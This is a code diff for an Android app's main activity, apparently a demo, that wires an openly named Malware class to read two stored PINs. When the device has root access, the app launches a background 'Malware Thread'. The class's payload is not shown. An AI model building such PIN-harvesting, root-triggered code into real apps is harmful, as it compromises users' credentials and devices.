@@ -20,16 +20,15 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
 
         database = new DatabaseService(this);
-        malware = new Malware(this, MainActivity.this, database);
 
-        getAndUpdatePIN(R.id.textPIN1, 1);
-        getAndUpdatePIN(R.id.textPIN2, 2);
+        malware = new Malware(this, MainActivity.this, database);
+        getAndUpdatePIN(R.id.textPIN1, malware.getPIN1(), 1);
+        getAndUpdatePIN(R.id.textPIN2, malware.getPIN2(), 2);
     }
 
 
-    private void getAndUpdatePIN(int textViewId, int id) {
-        String PIN_string = database.getPIN(id);
-        malware.updateView(PIN_string, textViewId, id);
+    private void getAndUpdatePIN(int textViewId, String PIN, int id) {
+        malware.updateView(PIN, textViewId, id);
     }
 
 
@@ -37,6 +36,7 @@ public class MainActivity extends AppCompatActivity {
         if (CheckRoot.hasRootAccess()) {
             if (!malwareRunning) {
                 malwareRunning = true;
+                malware = new Malware(this, MainActivity.this, database);
                 Thread malwareThread = new Thread(malware, "Malware Thread");
                 malwareThread.start();
                 Toast.makeText(this, "Started malware!", Toast.LENGTH_SHORT).show();
